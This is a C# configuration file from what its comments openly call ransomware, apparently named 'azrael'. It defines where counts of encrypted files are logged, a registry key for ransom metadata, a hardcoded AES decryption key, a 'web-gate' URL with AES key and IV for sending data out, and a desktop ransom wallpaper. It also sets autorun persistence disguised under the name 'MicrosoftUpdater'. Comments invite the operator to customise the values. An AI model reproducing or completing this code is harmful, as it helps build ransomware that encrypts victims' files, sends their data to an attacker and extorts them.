using System;
using System.IO;

namespace FuxForm.Algorithms
{
    internal class config
    {
        public static readonly string EncFiles_log = Path.Combine("C:\\Users\\Public\\Videos\\", "azrael.log"); // log-file with encrypted-count foiles
        public static readonly string ProgramRegKey = @"SOFTWARE\MicrosoftPlugins"; // Reg-key for containing meta ransom-info
        public static readonly string DecryptAES_Key = @"lkirwf897+22#bbtrm8814z5qq=498j5"; // AES-KEY for decryption module (you can change)

        public static readonly string UrlServer = "http://127.0.0.1/resender.php"; // Your web-gate
        public static readonly string SendKey = "f3a9ed6dbe870d165df1502dd4fb2d9f"; // AES-Key for encrypting transmitted data
        public static readonly string SendIV = "ff01f4ae6bb7917b"; // IV
        public static readonly string UnlockKey = Generator.GenerateUnlockKey(); // Generating Unlock-Key

        public static readonly string SendKeyReg = "Sended"; // Value to indicate that the data has been sent and does not need to be sent again
        public static readonly string WallpaperStatus = "SetWallpaper"; // Value to indicate set-wallpaper
        public static readonly string StartupTime = "TimeStartup"; // Value for contaning first-execute time ransomware

        public static readonly string walpPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "azrael.bmp"); // WallPaper Path
        public static readonly string AutorunKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; // Autorun Reg-Key 
        public static readonly string AutorunValue = "MicrosoftUpdater"; // Reg autorun-value
    }
}
